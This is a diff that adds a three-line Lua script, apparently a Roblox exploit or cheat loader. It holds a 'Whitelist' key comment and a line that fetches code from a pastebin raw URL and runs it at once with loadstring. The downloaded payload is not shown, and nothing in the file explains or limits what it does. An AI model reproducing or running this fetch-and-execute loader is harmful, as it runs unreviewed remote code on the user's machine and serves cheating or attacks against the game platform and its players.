@@ -1,0 +1,3 @@
+--Whitelist: 2m9bjsk2g3k9rjsa9jfmw
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/WeMJQnP3'),true))()
